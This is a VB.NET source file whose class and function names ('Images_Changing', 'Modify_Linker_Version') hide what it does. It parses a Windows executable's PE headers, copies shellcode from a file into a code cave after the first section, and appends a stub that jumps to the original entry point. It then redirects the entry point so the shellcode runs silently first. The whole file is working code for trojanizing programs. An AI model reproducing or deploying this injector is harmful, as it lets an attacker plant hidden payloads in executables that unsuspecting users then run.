Imports System.Runtime.InteropServices
Imports System.Text

Class Images_Changing
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure IMAGE_DOS_HEADER
        Public e_magic As UInt16
        ' Magic number
        Public e_cblp As UInt16
        ' Bytes on last page of file
        Public e_cp As UInt16
        ' Pages in file
        Public e_crlc As UInt16
        ' Relocations
        Public e_cparhdr As UInt16
        ' Size of header in paragraphs
        Public e_minalloc As UInt16
        ' Minimum extra paragraphs needed
        Public e_maxalloc As UInt16
        ' Maximum extra paragraphs needed
        Public e_ss As UInt16
        ' Initial (relative) SS value
        Public e_sp As UInt16
        ' Initial SP value
        Public e_csum As UInt16
        ' Checksum
        Public e_ip As UInt16
        ' Initial IP value
        Public e_cs As UInt16
        ' Initial (relative) CS value
        Public e_lfarlc As UInt16
        ' File address of relocation table
        Public e_ovno As UInt16
        ' Overlay number
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> _
        Public e_res1 As UInt16()
        ' Reserved words
        Public e_oemid As UInt16
        ' OEM identifier (for e_oeminfo)
        Public e_oeminfo As UInt16
        ' OEM information; e_oemid specific
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> _
        Public e_res2 As UInt16()
        ' Reserved words
        Public e_lfanew As Int32
        ' File address of new EXE header
    End Structure
    
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure IMAGE_OPTIONAL_HEADER32
        Public Magic As UInt16
        Public MajorLinkerVersion As [Byte]
        Public MinorLinkerVersion As [Byte]
        Public SizeOfCode As UInt32
        Public SizeOfInitializedData As UInt32
        Public SizeOfUninitializedData As UInt32
        Public AddressOfEntryPoint As UInt32
        Public BaseOfCode As UInt32
        Public BaseOfData As UInt32
        Public ImageBase As UInt32
        Public SectionAlignment As UInt32
        Public FileAlignment As UInt32
        Public MajorOperatingSystemVersion As UInt16
        Public MinorOperatingSystemVersion As UInt16
        Public MajorImageVersion As UInt16
        Public MinorImageVersion As UInt16
        Public MajorSubsystemVersion As UInt16
        Public MinorSubsystemVersion As UInt16
        Public Win32VersionValue As UInt32
        Public SizeOfImage As UInt32
        Public SizeOfHeaders As UInt32
        Public CheckSum As UInt32
        Public Subsystem As UInt16
        Public DllCharacteristics As UInt16
        Public SizeOfStackReserve As UInt32
        Public SizeOfStackCommit As UInt32
        Public SizeOfHeapReserve As UInt32
        Public SizeOfHeapCommit As UInt32
        Public LoaderFlags As UInt32
        Public NumberOfRvaAndSizes As UInt32
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> _
        Public DataDirectory As IMAGE_DATA_DIRECTORY()
    End Structure
    
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure IMAGE_FILE_HEADER
        Public Machine As UInt16
        Public NumberOfSections As UInt16
        Public TimeDateStamp As UInt32
        Public PointerToSymbolTable As UInt32
        Public NumberOfSymbols As UInt32
        Public SizeOfOptionalHeader As UInt16
        Public Characteristics As UInt16
    End Structure
    
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure IMAGE_DATA_DIRECTORY
        Public VirtualAddress As UInt32
        Public Size As UInt32
    End Structure
    
    Public Structure IMAGE_NT_HEADERS
        Public Signature As UInt32
        Public FileHeader As IMAGE_FILE_HEADER
        Public OptionalHeader As IMAGE_OPTIONAL_HEADER32
    End Structure

    Public Structure Misc
        Public PhysicalAddress As System.UInt32
        Public VirtualSize As System.UInt32
    End Structure
    
    <StructLayout(LayoutKind.Explicit)> _
    Public Structure IMAGE_SECTION_HEADER_Misc
        <FieldOffset(0)> _
        Public PhysicalAddress As System.UInt32
        <FieldOffset(0)> _
        Public VirtualSize As System.UInt32
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure IMAGE_SECTION_HEADER
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=8)> _
        Public Name As String
        Public Misc As IMAGE_SECTION_HEADER_Misc
        Public VirtualAddress As UInt32
        Public SizeOfRawData As UInt32
        Public PointerToRawData As UInt32
        Public PointerToRelocations As UInt32
        Public PointerToLinenumbers As UInt32
        Public NumberOfRelocations As UInt16
        Public NumberOfLinenumbers As UInt16
        Public Characteristics As UInt32
    End Structure



    Public Shared Function Modify_Linker_Version(ByVal b() As Byte) As Byte()
        Dim pIMAGE_DOS_HEADER As IMAGE_DOS_HEADER
        Dim PIMAGE_NT_HEADERS As IMAGE_NT_HEADERS
        Dim PIMAGE_SECTION_HEADER As IMAGE_SECTION_HEADER
        
        ' Load IMAGE_DOS_HEADER
        Dim ptbuffer As Integer = Marshal.UnsafeAddrOfPinnedArrayElement(b, 0)
        pIMAGE_DOS_HEADER = Marshal.PtrToStructure(CType(ptbuffer, IntPtr), pIMAGE_DOS_HEADER.GetType)

        ' Load IMAGE_NT_HEADERS
        PIMAGE_NT_HEADERS = Marshal.PtrToStructure(New IntPtr(ptbuffer + pIMAGE_DOS_HEADER.e_lfanew), PIMAGE_NT_HEADERS.GetType)
        
        ' Load IMAGE_SECTION_HEADER 
        PIMAGE_SECTION_HEADER = Marshal.PtrToStructure(New IntPtr(ptbuffer + pIMAGE_DOS_HEADER.e_lfanew + 248), PIMAGE_SECTION_HEADER.GetType)
        
        ' Modify EntryPoint 
        Dim lcodepos As Integer
        lcodepos = PIMAGE_SECTION_HEADER.Misc.VirtualSize + PIMAGE_SECTION_HEADER.PointerToRawData 'CodeCave Position
        
        Dim shellcode As Byte() = IO.File.ReadAllBytes(Application.StartupPath & "\shellcode.bin")
        Dim full As Byte() = {&H33, &HDB, &HBB, BitConverter.GetBytes(PIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + PIMAGE_NT_HEADERS.OptionalHeader.ImageBase)(0), BitConverter.GetBytes(PIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + PIMAGE_NT_HEADERS.OptionalHeader.ImageBase)(1), BitConverter.GetBytes(PIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + PIMAGE_NT_HEADERS.OptionalHeader.ImageBase)(2), BitConverter.GetBytes(PIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + PIMAGE_NT_HEADERS.OptionalHeader.ImageBase)(3), &HFF, &HD3, &HC3}
        Buffer.BlockCopy(shellcode, 0, b, lcodepos, shellcode.Length)
        Buffer.BlockCopy(full, 0, b, lcodepos + shellcode.Length, full.Length)
        PIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint = lcodepos + PIMAGE_NT_HEADERS.OptionalHeader.BaseOfCode - PIMAGE_SECTION_HEADER.PointerToRawData ' Change OEP In The Struct


        ' Initialize unmanged memory to hold the struct
        Dim spnt As IntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(PIMAGE_SECTION_HEADER))
        Dim pnt As IntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(PIMAGE_NT_HEADERS))
        
        ' Load The Structure Into pnt
        Marshal.StructureToPtr(PIMAGE_NT_HEADERS, pnt, False)
        Marshal.StructureToPtr(PIMAGE_SECTION_HEADER, spnt, False)
        
        ' Declare The Byte Array that will hold The Data Of The Structure
        Dim pd As Byte()
        ReDim pd(0 To 248) 'size of IMAGE_NT_HEADERS
        
        ' Copy The Structure Data to The Byte Array 
        Marshal.Copy(pnt, pd, 0, 248)
        
        ' Copy Structure Data Contained in The Byte Array (pd) To The Location Of IMAGE_NT_HEADERS in Byte Array (b)
        Buffer.BlockCopy(pd, 0, b, pIMAGE_DOS_HEADER.e_lfanew, 248)
        
        
        Return b
    End Function
    
End Class
